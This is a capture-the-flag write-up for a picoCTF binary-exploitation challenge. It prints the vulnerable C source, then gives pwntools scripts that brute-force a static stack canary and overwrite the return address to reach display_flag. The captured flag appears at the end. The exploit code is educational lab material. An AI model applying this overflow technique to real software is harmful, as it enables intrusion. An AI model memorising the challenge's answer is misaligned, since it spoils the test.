# CanaRy - Points: 300
<b>Description : </b>This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328. Source.<br>
<b>Hints : </b>Maybe there's a smart way to brute-force the canary?
# Solved
Take a look the source
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```
When i launch the program, i must input length of entry first.
```cpp
#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4
```
I fill it with 32 size. <i>If more than 32 and input more than 32 too, you will got message <b>** Stack Smashing Detected **</b></i>. After that, program want us input some string.
```
Ok... Now Where's the Flag?
```
To do this, i must bruteforce to get <b>key / canary</b> , so i write it with python script
```python
from pwn import *
import string

BUF_SIZE = 32
FLAG_LEN = 64
KEY_LEN  = 4

res = ""
for i in range(KEY_LEN):
    for s in string.ascii_letters + string.digits:
        with context.local(log_level="ERROR"):
            try:
                r = process("vuln")
                r.sendlineafter("Please enter the length of the entry:\n>", str(BUF_SIZE + len(res) + 1))
                r.sendlineafter("Input> ", fit({BUF_SIZE: res + s}))

                response = r.recvline()
                if b"Stack Smashing Detected" in response:
                    continue
                res += s

                print("[!] Temp Key : " + res)
                break
            finally:
                r.close()
    else:
        print "Key not found"
        exit(0)
print res
```
I run this inside the ssh connection for more better performance, cause my internet so bad!. This message i got
```
[!] Temp Key : 5
[!] Temp Key : 57
[!] Temp Key : 57G
[!] Temp Key : 57Gh
57Gh
```
We got the key! Now lets bruteforce to allocating the function <b>display_flag</b>
```
$1 = {<text variable, no debug info>} 0x7ed <display_flag>
```
```python
from pwn import *
import sys
import string

BUF_SIZE = 32
FLAG_LEN = 64
KEY_LEN  = 4
OV_OFFSET = 16

key = "57Gh"
display_flag = "\xed\x07" # struct.pack("<I", 0x7ed)

while True:
    r = process("./vuln")
    r.sendlineafter("Please enter the length of the entry:\n>", str(BUF_SIZE + KEY_LEN + (OV_OFFSET + 2)))

    payload = "A" * BUF_SIZE + key + "A" * OV_OFFSET + display_flag
    r.sendlineafter("Input> ", payload)

    response = r.recvall(timeout=0.4)
    if b"pico" in response or b"CTF" in response or "pico" in response:
        log.info("Payload : " + payload)
        log.info("Flag : " + response)
        exit(0)

    r.close()
```
Message
```
[+] Starting local process './vuln': pid 243127
[+] Receiving all data: Done (71B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 243127)
[*] Payload : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA57GhAAAAAAAAAAAAAAAA
[*] Flag : Ok... Now Where's the Flag?
    picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}
```
Flag : <b>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}</b>